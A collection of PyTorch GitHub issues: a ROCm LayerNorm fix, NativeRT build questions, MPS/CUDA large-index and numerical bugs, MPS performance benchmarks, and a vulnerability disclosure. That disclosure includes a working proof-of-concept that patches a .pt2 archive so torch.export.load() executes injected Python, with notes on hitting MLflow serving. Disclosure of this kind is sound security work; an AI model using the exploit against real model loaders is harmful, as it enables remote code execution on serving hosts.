> On constant input `delta` is exactly zero, so the mean cannot move regardless of how accurate `coef` is. This is architecture-independent by construction and brings `cuWelfordCombine` into agreement with `SharedReduceOps.h`. The select covers the idle-lane merge, where `dataA.count == 0` would otherwise rescale `dataB.mean` by `count * coef`; the mirrored case needs no guard because `nB` is then exactly zero. `sigma2` is unchanged - it already uses `nB` and is Chan's `M2` term, independent of how `mean` is formed.
>
> `__builtin_amdgcn_rcpf(1.0f)` is bit-exact, so `cuWelfordOnlineSum` (line 161), which uses the same intrinsic, is not implicated: on constant input its `delta` is exactly zero from the second element onward, and the first element divides by a count of exactly 1.
>
> Out of scope, stated so it is not mistaken for an oversight: `sigma2` still multiplies by `nB`, which on ROCm is still formed from the approximate reciprocal, so the variance - and hence `rstd` - remains inexact for non-constant input. That is ordinary floating-point accuracy rather than the exactness bug reported here.
>
> ## Verification
>
> With the patch applied, all 1024 widths return exactly zero in fp32, bf16 and fp16, and the saved mean is bit-exactly `0x3F800000` throughout. Reverting the kernel hunk and rebuilding reproduces the failures at exactly the predicted widths. `test_nn.py -k LayerNorm` (44), `-k rmsnorm` (12) and `test_ops.py -k layer_norm` (164) all pass with the patch.
>
> Throughput, fp32 forward, MI355X, same tree and flags, best of 5 medians per run, ~256 MB of input at each width:
>
> | W | unpatched | patched |
> |---|---|---|
> | 384 | 228.55 us, 2349.0 GB/s | 225.12 us, 2384.8 GB/s |
> | 4096 | 123.56 us, 4345.1 GB/s | 123.20 us, 4357.7 GB/s |
>
> Run-to-run spread across four repeats of the patched build was 0.34% at W=384 and 0.08% at W=4096, so there is no throughput regression. The patched build measured marginally faster, but the unpatched column is a single sample and no speedup is claimed.
>
> ## Backward
>
> `native_layer_norm_backward` does not recompute the mean; it consumes the saved `mean`/`rstd`, and its own `1/N` is a hoisted true divide. It has no Welford reduction, so it inherits the forward error rather than adding one. Both ROCm paths were exercised - `layer_norm_grad_input_kernel` below M=32768 and `cuComputeGradInput` at or above it.
>
> Worth stating plainly, because it bounds what this bug explains: on a **near**-constant input (`ones + 1e-6 * randn`) the max abs dX error against an fp64 reference is **unchanged** by the fix - 2.14e-04 at W=384 both before and after, and likewise at every other width tested. Once the input is not exactly constant the per-lane means differ, ordinary reduction rounding amplified by `rstd` dominates, and the one-ulp mean bias is no longer the leading term. What the fix closes exactly is the exactly-constant case.
>
> ## Workaround for existing ROCm builds
>
> Rebuilding with `USE_LAYERNORM_FAST_RECIPROCAL=0` removes the 691-width ROCm case but leaves the 131-width IEEE case, so it is a mitigation, not a fix.
>
> ## Environment
>
> ```
> torch     : 2.11.0+rocm7.14.1 (reproduction) / built from source at HIP 7.14.60850 (fix)
> HIP       : 7.14.60850
> device    : AMD Instinct MI355X, gfx950:sramecc+:xnack-
> ```
>
>

title: [nativert] Is NativeRT intended for OSS users? Request to re-enable it in the CMake build
body:
### 🚀 The feature, motivation and pitch

We'd like to use NativeRT as the C++ runtime for `torch.export` models in our inference stack. Right now NativeRT is no longer a part of OSS PyTorch builds. Before investing in it, we would like to understand whether NativeRT is meant for OSS users.

I used Claude to help collect the build history and draft the details below; I reviewed them.

> **Context**
>
> - [RFC-0043](https://github.com/pytorch/rfcs/pull/72) describes NativeRT as "the standard C++ runtime succeeding TorchScript", exposed as a component of libtorch.
> - It was removed from the CMake build in #164463 (CUDA sources and tests) and #178475 (the rest). Since 2.12, NativeRT is not available in pip wheels or libtorch. Only the Bazel and BUCK builds still include it.
>
> **Questions**
>
> 1. Why was NativeRT removed from the OSS build? Was it build breakage, binary size, or a decision that it stays internal for now?
> 2. Is there a plan to make NativeRT available to OSS users again? If not, what is the suggested alternative ?
> 3. If OSS support is wanted, would you accept PRs that restore the CMake build (CPU + CUDA, including `AOTInductorModelContainerCudaShim.cpp` and `CudaTritonKernelManager.cpp`) together with CI coverage? We're willing to do that work.

title: [MPS] `nll_loss` / `cross_entropy` silently return 0 for rows whose target element lies at flat index 2**31 or beyond
body:
### 🐛 Describe the bug

On MPS, `F.nll_loss(input, target)` with an input of shape `(N, C)` silently returns a wrong per-sample loss for every row `i` whose target element lies at flat index `i * C + target[i] >= 2**31` of the input. Almost all of these losses are exactly 0. Every other row is correct, and there is no error or warning. `F.cross_entropy` goes through `nll_loss` after `log_softmax` and is affected in the same way, with `reduction="none"`, `"sum"` and `"mean"`. `log_softmax` itself is correct at these sizes, and `-F.log_softmax(x, -1).gather(1, t[:, None])` gives the correct values.

The boundary is on the flat index of the target element, not on the row. With `C = 250` and `N = 2**23 + 2**20`, row 8589934 contains element 2**31 (at column 148). Its target is 43 (flat index 2147483543) and its loss is correct, while row 8589935 (target 158, flat index 2147483908) returns 0. Of the 9,437,184 rows, the 847,249 wrong rows are exactly those whose target element lies at flat index 2**31 or later.

This happens below 2**32 elements, so it is reached in ordinary training with a large vocabulary: with 128,256 classes, the logits of 16,744 or more tokens (for example 16 sequences of 2,048 tokens) exceed 2**31 elements. With `reduction="mean"`, the loss is then silently too small by the share of affected rows. In our training-step runs with `cross_entropy` on 2**32 elements, the gradient with respect to the input was correct; only the loss value was wrong (about half of the reference). With 2**32 elements some of the wrong values are also non-zero garbage, and with inputs uniform on [-4, 4) the sum became NaN.

The same rows are wrong on 2.4.1, 2.9.1, 2.13.0 and 2.14.0, so this is not a recent regression.

### Minimal reproduction

Needs about 35 GB of unified memory and runs in about 10 seconds.

```python
import torch
import torch.nn.functional as F

torch.manual_seed(0)
N, C = 2**23 + 2**16, 256                  # input has 2**31 + 2**24 elements
x = torch.rand(N, C) * 8 - 4
t = torch.randint(0, C, (N,))
xm, tm = x.to("mps"), t.to("mps")

loss = F.cross_entropy(xm, tm, reduction="none").cpu()
ref = F.cross_entropy(x, t, reduction="none")          # CPU
bad = (loss - ref).abs() > 1e-4
beyond = torch.arange(N) * C + t >= 2**31              # flat index of the target element
print("wrong rows:", bad.sum().item(), "| rows whose target lies at flat index >= 2**31:", beyond.sum().item(),
      "| same rows:", torch.equal(bad, beyond), "| wrong values that are 0:", (loss[bad] == 0).sum().item())
print("sum on MPS:", F.cross_entropy(xm, tm, reduction="sum").item(), "| CPU:", ref.double().sum().item())
print("-log_softmax(x).gather(...).sum() on MPS:", (-F.log_softmax(xm, -1).gather(1, tm[:, None])).sum().item())
```

Output on PyTorch 2.14.0, macOS 27.0 (26A428), MacBook Pro M2 Max 96 GB:

```
wrong rows: 65536 | rows whose target lies at flat index >= 2**31: 65536 | same rows: True | wrong values that are 0: 65536
sum on MPS: 62565556.0 | CPU: 63054878.21647382
-log_softmax(x).gather(...).sum() on MPS: 63054876.0
```

### CUDA is correct with the same code

The same script, with only the device string changed from `"mps"` to `"cuda"`, is correct on an NVIDIA A100-SXM4-80GB (PyTorch 2.14.0+cu130, CUDA 13.0, driver 580.82.07):

```
wrong rows: 0 | rows whose target lies at flat index >= 2**31: 65536 | same rows: False | wrong values that are 0: 0
sum on CUDA: 63054880.0 | CPU: 63054878.216116905
-log_softmax(x).gather(...).sum() on CUDA: 63054880.0
```

(`same rows: False` only because no row is wrong.) The `C = 250` input described above has no wrong row on CUDA either, and with exactly 2**32 elements (`N = 2**24`, `C = 256`), `cross_entropy` with every reduction and `nll_loss` match the reference on CUDA, where MPS returns NaN for the sum.

### Workaround

Compute the loss as `-F.log_softmax(x, -1).gather(1, t[:, None])` (followed by the desired reduction), or split the rows so that each call to `nll_loss` / `cross_entropy` sees fewer than 2**31 input elements.

### Versions

```
PyTorch version: 2.14.0 (same result on 2.4.1, 2.9.1 and 2.13.0)
OS: macOS 27.0 (26A428, arm64)
Python version: 3.12.11
CPU: Apple M2 Max (96 GB unified memory); the 2**32-element training-step runs on Apple M2 Ultra (192 GB)
dtype: float32
```

title: Could not gaurd on data-dependent expression for SDPA
body:
### 🐛 Describe the bug

When trying to export this model, we are seeing issues where aot_export is not able to handle dynamic sequence length. This can be worked around by using `torch._check`, but its not fully clear what the implications here would be and ideally we wouldn't need to modify our code to trace this module. 

```py
from contextlib import nullcontext

import torch
import torch.nn as nn
import torch.nn.functional as F
import torch_tensorrt


class SampleNetwork(nn.Module):
    def __init__(
        self,
        num_attention_heads: int,
    ) -> None:
        super().__init__()

        self.heads = num_attention_heads

    def forward(
        self,
        query: torch.Tensor,
        key: torch.Tensor,
        value: torch.Tensor,
    ) -> torch.Tensor:
        query = query.unflatten(2, (self.heads, -1)).transpose(1, 2)
        key = key.unflatten(2, (self.heads, -1)).transpose(1, 2)
        value = value.unflatten(2, (self.heads, -1)).transpose(1, 2)

        query_idx = torch.tensor(query.size(3), device=query.device)
        key_idx = torch.tensor(key.size(3), device=key.device)
        value_idx = torch.tensor(value.size(3), device=value.device)
        # Use expand operations instead of repeat_interleave for torch_tensorrt compatibility
        # key = key.expand(-1, -1, -1, query_idx // key_idx * key.size(3))
        # value = value.expand(-1, -1, -1, query_idx // value_idx * value.size(3))
        key = key.repeat_interleave(query_idx // key_idx, dim=3)
        value = value.repeat_interleave(query_idx // value_idx, dim=3)

        # hidden_states = query + key + value
        hidden_states = F.scaled_dot_product_attention(
            query, key, value, attn_mask=None, dropout_p=0.0, is_causal=False
        )
        hidden_states = hidden_states.transpose(1, 2).flatten(2, 3).type_as(query)

        return hidden_states


def export_attention(model, query, key, value):
    with torch.no_grad():
        # Only mark sequence length as dynamic, like run_llm.py does
        # Don't mark batch dimension as dynamic to avoid constraint violations
        seq_len = torch.export.Dim("seq_len", min=1, max=56320)
        print("Trying to export the model using torch.export.export()..")
        # strict=False only enables autograd tracing and excludes dynamo.
        # Use tuple format like export_llm - only mark sequence length (dim 1) as dynamic
        ep = torch.export.export(
            model,
            args=(query, key, value),
            kwargs={},
            dynamic_shapes=({1: seq_len}, {1: seq_len}, {1: seq_len}),
            strict=False,
        )

    return ep


if __name__ == "__main__":
    precision = "BF16"
    min_block_size = 1
    batch_size = 1
    seq_len = 28160
    num_attention_heads = 32
    attention_head_dim = 128
    enable_pytorch_run = True
    debug = False
    device = "cuda"

    with torch.inference_mode():
        hidden_size = num_attention_heads * attention_head_dim

        model = SampleNetwork(
            num_attention_heads=num_attention_heads,
        ).to(device)

        # Convert model to the appropriate precision
        model = model.to(torch.bfloat16)
        input_dtype = torch.bfloat16

        # Prepare input for benchmarking or evaluation
        query = torch.randn(batch_size, seq_len, hidden_size, dtype=input_dtype).to(
            device
        )
        key = torch.randn(batch_size, seq_len, hidden_size, dtype=input_dtype).to(
            device
        )
        value = torch.randn(batch_size, seq_len, hidden_size, dtype=input_dtype).to(
            device
        )

        # Pyt
        pyt_output = model(query, key, value)
        print("PyTorch output shape:", pyt_output.shape)
        print("Pytorch output first 10 elements:", pyt_output.flatten()[:10])

        # Export Model
        ep = export_attention(model, query, key, value)
```

title: [MPS] `torch.arange` with more than 2**32 elements silently writes only the first N mod 2**32 elements (regression in 2.14.0)
body:
### 🐛 Describe the bug

On MPS, `torch.arange(N)` with N > 2**32 returns a tensor in which only the first `N mod 2**32` elements are written; every other element is zero. There is no error or warning. On 2.12.1 and 2.13.0 the same call raises `MPSGraph does not support tensor dims larger than INT_MAX`, so 2.14.0 turned an explicit error into a silently wrong result. `torch.full` with the same N is correct on 2.14.0.

I mentioned this in a comment on #197636 and am splitting it out here, since it is unrelated to `bmm`. The CUDA counterpart, where every element from index 2**32 onward is zero, was #197673.

```python
import torch

N = 2**32 + 2**20
x = torch.arange(N, dtype=torch.int64, device="mps")
print({i: x[i].item() for i in (0, 2**20 - 1, 2**20, 2**31, N - 1)})
```

```
# 2.14.0:          {0: 0, 1048575: 1048575, 1048576: 0, 2147483648: 0, 4296015871: 0}
# 2.12.1 / 2.13.0: RuntimeError: MPSGraph does not support tensor dims larger than INT_MAX
```

Expected: `x[i] == i` for every `i`, or an error as in 2.13.0.

### Versions

```
PyTorch version: 2.14.0 (2.12.1 and 2.13.0 raise instead)
OS: macOS 27.0 (arm64)
Python version: 3.12.12
CPU: Apple M2 Ultra (192 GB unified memory)
```

body:
## 🐛 Describe the bug

On CUDA, `torch.arange(N, dtype=torch.int64)` with `N > 2**32` returns a tensor whose first `2**32` elements are correct and whose remaining elements are all zero. No error or warning is raised. The same call on CPU is correct.

```python
import torch

N = 2**32 + 2**20  # ~34 GB as int64
x = torch.arange(N, dtype=torch.int64, device="cuda")
print(x[2**32 - 1].item(), x[2**32].item(), x[-1].item())
print("nonzero from 2**32 on:", (x[2**32:] != 0).sum().item(), "of", N - 2**32)
```

Output on an A100-SXM4-80GB with torch 2.11.0+cu128:

```
4294967295 0 0
nonzero from 2**32 on: 0 of 1048576
```

Expected (and what CPU gives): `4294967295 4294967296 4296015871`, with all `2**20` trailing elements nonzero.

Additional observations:

- `x[2**32]` and `x[-1]` are also 0 on torch 2.12.1+cu130, 2.13.0+cu130 and 2.14.0+cu130.
- On 2.11.0+cu128, `N = 2**32 + 5` also leaves the last 5 elements at zero, and `N = 2**31 + 5` is correct.
- On 2.11.0+cu128, `torch.empty(N, dtype=torch.int64, device="cuda").fill_(7)` with the same `N` is correct up to the last element, so indexing and reading back large tensors work. Only the values written by `arange` are wrong.

### Related

- #182657 fixed the same symptom on ROCm ("accepted silently with the kernel never executing, leaving zero-initialized output") for `N >= 2**32`. Its description says the non-ROCm path was left untouched.
- `test_range_factories_64bit_indexing` in `test/test_tensor_creation_ops.py` (`@onlyCUDA`) checks `N = 2**31 + 1` on every GPU build, but checks `N = 2**32 + 1` and `N = 2**33 + 1` only under `TEST_WITH_ROCM`. So the CUDA path is not tested above `2**32`.
- Found while checking a similar problem on MPS (#197636).

## Versions

```
GPU: NVIDIA A100-SXM4-80GB (Google Colab)
PyTorch: 2.11.0+cu128 (CUDA 12.8); 2.12.1+cu130, 2.13.0+cu130, 2.14.0+cu130 (CUDA 13.0)
Python: 3.13 (2.11.0), 3.12 (2.12.1 to 2.14.0)
```

title: [MPS] torch.histc and torch.linalg.solve_triangular are 9-1800x slower than alternatives on MPS
body:
## 🐛 Describe the bug

Two MPS ops are slow enough to dominate inference of common models in `transformers` on Apple Silicon.

**1. `torch.histc`** costs about 0.17 ms per bin, independent of input size. An equivalent `scatter_add_` or `bincount`
is 40-1800x faster:

| elements | bins | histc | scatter_add_ | bincount |
|---|---|---|---|---|
| 8 | 64 | 11.5 ms | 0.024 ms | 0.27 ms |
| 1024 | 128 | 21.8 ms | 0.023 ms | 0.26 ms |
| 944 | 256 | 43.9 ms | 0.024 ms | 0.26 ms |
| 65536 | 256 | 45.1 ms | 0.059 ms | 1.15 ms |

(Results equal in every row.) `transformers` calls `histc` once per MoE layer to count tokens per expert, which makes
decoding a Qwen3-30B-A3B-shaped model about 3.4x slower than it needs to be.

**2. `torch.linalg.solve_triangular`** (lower, `unitriangular=True`, batched 64x64 systems, fp32) is 9-13x slower than
the same solve on CPU, and 9-85x slower than a batched-matmul block inverse on MPS:

| batch (heads x chunks) | MPS solve | CPU solve | block inverse on MPS |
|---|---|---|---|
| 32 x 2 | 3.3 ms | 0.35 ms | 0.36 ms |
| 32 x 10 | 18.2 ms | 1.39 ms | 0.40 ms |
| 32 x 64 | 117.7 ms | 8.8 ms | 1.38 ms |

This is the call in the gated-delta-rule attention (Qwen3.5, Qwen3-Next), twice per layer.

## Repro

`bench_mps.py` (torch only) prints both tables:

<details><summary>bench_mps.py</summary>

```python
"""MPS slow paths hit by transformers MoE / gated-delta-rule models. Run: python bench_mps.py"""
import platform, subprocess, time
import torch


def ms(f, n=20):
    f(); torch.mps.synchronize(); t = time.perf_counter()
    for _ in range(n): f()
    torch.mps.synchronize(); return (time.perf_counter() - t) / n * 1000


print(f"torch {torch.__version__}, macOS {platform.mac_ver()[0]}, "
      f"{subprocess.run(['sysctl', '-n', 'machdep.cpu.brand_string'], capture_output=True, text=True).stdout.strip()}")

print("\n1. histc of expert ids (float, bins = num_experts, min 0, max num_experts - 1)")
print(f"{'ids':>8} {'experts':>8} {'histc':>10} {'scatter_add':>12} {'bincount':>10}   equal")
for n_ids, E in ((8, 64), (1024, 128), (944, 256), (8192, 256), (65536, 256)):
    ids = torch.randint(0, E, (n_ids,), device="mps")
    f = ids.float()
    h = lambda: torch.histc(f, bins=E, min=0, max=E - 1)
    s = lambda: torch.zeros(E, device="mps").scatter_add_(0, ids, torch.ones(n_ids, device="mps"))
    b = lambda: torch.bincount(ids, minlength=E)
    print(f"{n_ids:>8} {E:>8} {ms(h):>8.2f}ms {ms(s):>10.3f}ms {ms(b):>8.3f}ms   {torch.equal(h(), s())}")

print("\n2. unit lower-triangular solve, gated delta rule shapes (fp32, chunk 64, v_dim 128)")


def block_inverse(A):  # [[A11,0],[A21,A22]]^-1 = [[X11,0],[-X22 A21 X11, X22]], block size 1 -> n
    n = A.shape[-1]; inv = torch.ones(*A.shape[:-2], n, 1, 1, device=A.device, dtype=A.dtype); b = 1
    while b < n:
        nb = n // (2 * b)
        blk = A.reshape(*A.shape[:-2], nb, 2 * b, nb, 2 * b).diagonal(dim1=-4, dim2=-2).movedim(-1, -3)
        x11, x22 = inv[..., 0::2, :, :], inv[..., 1::2, :, :]
        new = torch.zeros(*A.shape[:-2], nb, 2 * b, 2 * b, device=A.device, dtype=A.dtype)
        new[..., :b, :b], new[..., b:, b:], new[..., b:, :b] = x11, x22, -(x22 @ blk[..., b:, :b] @ x11)
        inv, b = new, 2 * b
    return inv[..., 0, :, :]


def export_loop(A):  # transformers' existing is_torchdynamo_exporting() path
    u = -A.tril(-1)
    for i in range(1, A.shape[-1]):
        row, sub = u[..., i, :i].clone(), u[..., :i, :i].clone()
        u[..., i, :i] = row + (row.unsqueeze(-1) * sub).sum(-2)
    return u + torch.eye(A.shape[-1], device=A.device)


print(f"{'heads x chunks':>15} {'MPS solve':>10} {'CPU solve':>10} {'export loop':>12} {'block inv':>10}   max |diff| block vs MPS solve")
for heads, chunks in ((32, 2), (32, 10), (32, 64)):
    g = torch.Generator().manual_seed(0)
    k = torch.nn.functional.normalize(torch.randn(1, heads, chunks, 64, 128, generator=g), dim=-1)
    beta, decay = torch.rand(1, heads, chunks, 64, 1, generator=g), torch.rand(1, heads, chunks, 64, generator=g) * -0.05
    cd = decay.cumsum(-1); pw = (cd.unsqueeze(-1) - cd.unsqueeze(-2)).masked_fill(torch.ones(64, 64, dtype=torch.bool).triu(1), float("-inf")).exp()
    A = ((k * beta) @ k.transpose(-1, -2) * pw).tril(-1) + torch.eye(64)  # realistic: entries up to ~1
    B = torch.randn(1, heads, chunks, 64, 128, generator=g)
    Am, Bm = A.to("mps"), B.to("mps")
    ref = torch.linalg.solve_triangular(Am, Bm, upper=False, unitriangular=True)
    t_mps = ms(lambda: torch.linalg.solve_triangular(Am, Bm, upper=False, unitriangular=True))
    t0 = time.perf_counter(); [torch.linalg.solve_triangular(A, B, upper=False, unitriangular=True) for _ in range(20)]; t_cpu = (time.perf_counter() - t0) / 20 * 1000
    t_loop = ms(lambda: export_loop(Am.clone()) @ Bm, n=3)
    t_blk = ms(lambda: block_inverse(Am) @ Bm)
    diff = (block_inverse(Am) @ Bm - ref).abs().max().item()
    print(f"{heads:>7} x {chunks:<5} {t_mps:>8.2f}ms {t_cpu:>8.2f}ms {t_loop:>10.2f}ms {t_blk:>8.2f}ms   {diff:.1e} (|x| max {ref.abs().max().item():.1f})")
```

</details>

Minimal version of the first:

```python
import torch, time
ids = torch.randint(0, 256, (944,), device="mps").float()
torch.histc(ids, bins=256, min=0, max=255); torch.mps.synchronize()
t = time.perf_counter()
for _ in range(20): torch.histc(ids, bins=256, min=0, max=255)
torch.mps.synchronize(); print((time.perf_counter() - t) / 20 * 1000, "ms")  # ~44 ms
```

## Versions

torch 2.14.0, macOS 26.5.2, Apple M5 Max (128 GB). Not yet checked on nightly.

Related: #53194 (histc vs bincount performance, CUDA), #195076 (MPS histogram edge handling), #197236 (MPS linalg solve
layout).

title: Python code injection via unvalidated lifted-tensor placeholder names in torch.export (PT2) archives — attacker-controlled identifier is emitted into FX-generated forward() and executed by exec(compile(...)) during torch.export.load()
body:
### 🐛 Describe the bug

### Summary

torch.export.load() deserializes PT2 archives (.pt2, the pickle-free export format) without
validating identifier strings from `model.json`. The lifted-placeholder tensor names are passed
straight into FX graph construction and code generation. A placeholder name shaped like
`identifier=(python_expression)` is emitted verbatim into the generated function signature as

    def forward(self, x, p_lin_weight, p_lin_bias=(open('/out/pwned','w').write('x') or None)):

`exec(compile(src, ...))` — which compiles the generated GraphModule — evaluates default-argument
expressions at function-definition time. Therefore simply loading an attacker-supplied .pt2 file
executes attacker-controlled Python code inside the loading process, before any post-deserialize
validation runs.

### Technical details (verified against main @ 08187d9e0fba026dc8217405802ab5381dc88d90)

1. `torch/_export/serde/serialize.py:2562-2569` (deserialize path; the sym_int twin at
   2570-2577 has the same pattern) takes the file-controlled string as a placeholder name:

       node_name = input_.value.name
       placeholder_node = self.graph.placeholder(node_name)
       # FX might declare a name illegal (e.g. some nn.Modules use "input" as forward() arguments)
       # we will overwrite it
       placeholder_node.name = node_name
       self.sync_fx_node(node_name, placeholder_node)

2. FX's own sanitization is bypassed in two ways:
   - `torch/fx/graph.py` `create_node()` sanitizes only the derived node NAME through the graph
     namespace (`_illegal_char_regex = re.compile("[^0-9a-zA-Z_]+")`); the `target` is stored
     verbatim on the Node.
   - lines 2568-2569 then force the raw string back over FX's sanitized name, with the comment
     explicitly acknowledging that FX "might declare a name illegal ... we will overwrite it".
3. `torch/fx/graph.py` `process_placeholder()` (~lines 868-880) emits `node.target` verbatim
   into the generated `def forward(...)` parameter list.
4. `torch/fx/graph_module.py:145` — `exec(compile(src, key, "exec", dont_inherit=True), globals)`
   — executes the generated source; the injected `=(...)` default-value expression is evaluated
   at definition time, i.e. inside `torch.export.load()`.

### Attack prerequisites (all attacker-side; nothing unusual required)

- The payload name must be placed as the LAST graph input so the generated parameter becomes a
  trailing default argument (syntactically valid Python). The corresponding
  `signature.input_specs` order must be kept consistent (also attacker-controlled JSON).
- The name must be replaced consistently in the four places it appears in
  `<stem>/models/model.json`: `graph_module.graph.inputs`, `graph_module.signature.input_specs`,
  `graph_module.graph.tensor_values` (dict key), and the `aten::linear` node argument.

### Minimal PoC (works on torch 2.14.0)

    import json, os, zipfile
    import torch, torch.nn as nn

    PAYLOAD = "p_lin_bias=(open('/out/pwned_by_pt2_lifted_name','w').write('mbe2e268') or None)"

    class M(nn.Module):
        def __init__(self):
            super().__init__(); self.lin = nn.Linear(4, 2)
        def forward(self, x):
            return self.lin(x)

    os.makedirs("/out", exist_ok=True)
    ep = torch.export.export(M().eval(), (torch.randn(3, 4),))
    torch.export.save(ep, "model.pt2")

    with zipfile.ZipFile("model.pt2") as z:
        entries = [(i, z.read(i.filename)) for i in z.infolist()]
    jname = next(i.filename for i, _ in entries if i.filename.endswith("/models/model.json"))
    j = json.loads(dict((i.filename, b) for i, b in entries)[jname])

    def rename(o):  # rename the lifted placeholder in values AND dict keys
        if isinstance(o, dict):
            return {(PAYLOAD if k == "p_lin_bias" else k): rename(v) for k, v in o.items()}
        if isinstance(o, list):
            return [rename(v) for v in o]
        return PAYLOAD if o == "p_lin_bias" else o

    j = rename(j)
    g = j["graph_module"]
    g["graph"]["inputs"] = [{"as_tensor": {"name": n}} for n in ("x", "p_lin_weight", PAYLOAD)]
    specs = g["signature"]["input_specs"]          # [weight, bias, x] -> [x, weight, payload]
    g["signature"]["input_specs"] = [specs[2], specs[0], specs[1]]

    with zipfile.ZipFile("malicious.pt2", "w", zipfile.ZIP_DEFLATED) as z:
        for info, data in entries:
            z.writestr(info, json.dumps(j, indent=4).encode()
                       if info.filename == jname else data)

    print(os.path.exists("/out/pwned_by_pt2_lifted_name"))  # False
    torch.export.load("malicious.pt2").module()             # payload runs inside load()
    print(open("/out/pwned_by_pt2_lifted_name").read())     # mbe2e268

### Reporter-verified results

On torch 2.14.0+cpu (wheel `torch.version.git_version` == 08187d9e0fba026dc8217405802ab5381dc88d90):

- `torch.export.load("malicious.pt2")` writes the canary file (`mbe2e268`) during loading;
  the generated signature at codegen time is literally
  `def forward(self, x, p_lin_weight, p_lin_bias=(open('/out/pwned_by_pt2_lifted_name','w').write('mbe2e268') or None)):`
  while the final post-unlift graph is clean (`def forward(self, x):`) and inference still works,
  so the execution leaves no trace in the loaded artifact.
- Negative control: the identical patch procedure with the harmless identifier
  `p_lin_bias_x` (same reorder) loads cleanly and writes no canary — isolating the injected
  expression characters as the only difference.
- Aggravating: when `signature.input_specs` is left inconsistent, `torch.export.load()` raises
  `SpecViolationError` — but only AFTER the payload has already executed. Code execution
  precedes post-deserialize validation, so even archives that would be rejected as invalid
  execute attacker code.

### Downstream impact example: MLflow model serving

MLflow's `mlflow.pytorch` flavor defaults to `serialization_format="pt2"` and its documentation
explicitly recommends PT2 as the safe alternative to pickle (pickle path triggers a hard error
unless `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=true`). On serve, `mlflow models serve` loads
`data/model.pt2` via `torch.export.load(...)` (mlflow/pytorch/__init__.py, `_load_model`),
i.e. exactly the hardening configuration an operator would choose. Swapping the .pt2 artifact
of a genuine `mlflow.pytorch.save_model(..., serialization_format="pt2")` directory with the
crafted file gives arbitrary code execution in the serving process at startup, with pickle
deserialization disabled; serving then continues normally (HTTP 200 on /invocations). The
reporter verified this end to end with mlflow 3.16.1 in an isolated environment.

### Why this is a framework vulnerability (re: "Issues That Are Not Security Vulnerabilities")

- The injected string is DATA (an identifier field), not model code. PyTorch's code generator
  converts that data field into executable Python. `torch.export.load()` performs no
  identifier validation and offers no `weights_only`-style opt-in/out — there is no safe way
  for a downstream loader to consume an untrusted PT2 archive today.
- PT2 is positioned in PyTorch's own SECURITY.md ("Give preference to share and load weights
  with the appropriate format"; Safetensors "most safe ... torch.load ... larger surface") and
  by downstream projects as the safe, non-pickle alternative. An operator who has done exactly
  what the security policy asks — avoid pickle, prefer the restricted format — still gets RCE
  from a data field that should never be code.
- "An attacker who already has the ability to execute arbitrary code locally ... does not gain
  any additional capability" does not apply: the attacker only supplies a model FILE to a
  remote loading/serving process; the code execution is produced by the deserializer itself.

### Suggested fix

Validate every deserialized identifier before it reaches FX — e.g. require
`^[A-Za-z_][0-9a-zA-Z_]*$` (matching FX's own `_name_regex`) for placeholder/attribute names
in the deserialize path, and stop overwriting the namespace-sanitized node name. A regression
test loading an archive with hostile placeholder names (`ident=(expr)`) would cover it.

### Versions

PyTorch (pytorch/pytorch), torch.export.load / torch._export serde deserialization path.
Verified affected: torch 2.14.0 (stable CPU wheel for Linux, torch.version.git_version ==
08187d9e0fba026dc8217405802ab5381dc88d90; repository main at the same commit).
Earlier releases sharing the same serde code path are likely affected; exact introduced
version not determined.
Consumer context (verified code paths): MLflow 3.16.1 `mlflow.pytorch` flavor
(serialization_format defaults to "pt2") loads model.pt2 via torch.export.load during
`mlflow models serve`.

title: torch.topk returns different values on CPU and CUDA for a 0-D input with k=0
body:
### 🐛 Describe the bug

`torch.topk` returns different values on CPU and CUDA for the same 0-D input when `k=0`.

For example, with a float32 scalar containing `3.5`, the CPU result contains `3.5`, while the CUDA result contains `0.0`. Both `values` and `indices` are 0-D tensors, and both devices return index `0`.


### To reproduce

```python
import torch

print("PyTorch:", torch.__version__)

for device in ("cpu", "cuda"):
    for dtype, value in ((torch.float32, 3.5), (torch.int64, 7)):
        x = torch.tensor(value, dtype=dtype, device=device)
        values, indices = torch.topk(x, k=0)

        if device == "cuda":
            torch.cuda.synchronize()

        print(
            device,
            dtype,
            values.cpu(),
            indices.cpu(),
            values.shape,
            indices.shape,
        )
```
On PyTorch 2.13.0+cu130, the float32 case prints a value of 3.5 on CPU and 0.0 on CUDA. The int64 case also returns different values on CPU and CUDA.
Expected: CPU and CUDA should return consistent results for the same input and arguments. Please clarify the intended behavior for a 0-D input when k=0.
A related but different issue is #49205, which concerns a CUDA assertion for a 1-D input with k=0. This report concerns a 0-D input and a CPU/CUDA result mismatch.

### Versions

CPU arm: PyTorch 2.14.0+cu130, Python 3.10.12, Ubuntu 22.04 (x86_64)
CUDA arm: PyTorch 2.14.0+cu130, CUDA 13.0, cuDNN 9.24.0, RTX 5090, driver 580.76.05

title: torch.linalg.svdvals silently returns NaN for inf input while NaN input raises LinAlgError
body:
### 🐛 Describe the bug

### Description
torch.linalg.svdvals rejects a matrix containing NaN with LinAlgError: linalg.svd: The algorithm failed to converge because the input matrix contained non-finite values, but a matrix containing inf (equally non-finite) is accepted and returns NaN singular values, with no error or warning. NaN violates the documented contract that singular values are returned (non-negative) in descending order, and the NaN propagates silently into matrix_norm(..., 'nuc'), cond, matrix_rank and pinv. NumPy's linalg.svd(A, compute_uv=False), which the documentation names as the equivalent, raises LinAlgError: array must not contain infs or NaNs for both inputs.

### Steps to reproduce
```
import torch
print(torch.linalg.svdvals(torch.tensor([[float("inf")]])))   # tensor([nan])
torch.linalg.svdvals(torch.tensor([[float("nan")]]))          # LinAlgError: ... non-finite values
```

###  Expected
inf is rejected like NaN (the error message already says "non-finite values").

### Versions

Environment
PyTorch 2.14.0 (the latest release, CPU wheel) and 2.12.0, Python 3.12, Ubuntu 24.04, x86_64

title: Functions depending on SVD are broken for inputs with non-finite values with MKL 2022+ and OpenBLAS 0.3.15+
body:
### 🐛 Describe the bug

Last year LAPACK decided to change the behavior of computation of SVD for matrices with non-finite values. This comment https://github.com/numpy/numpy/issues/18914#issuecomment-839941847 contains the summary of the changes in Reference-LAPACK.
This change was picked up by OpenBLAS 0.3.15 and tests started to fail (see https://github.com/pytorch/pytorch/issues/67693).
Later MKL 2022 also started to use the latest Reference LAPACK behavior resulting in tests breaking on our CI: https://github.com/pytorch/pytorch/issues/71645.

See the example in https://github.com/numpy/numpy/issues/18914#issuecomment-1023155562 how changing MKL version affects the SVD computation in NumPy and the behavior is the same in PyTorch.

List of functions that need to be modified to work correctly with new MKL and OpenBLAS versions:
- torch.linalg.norm
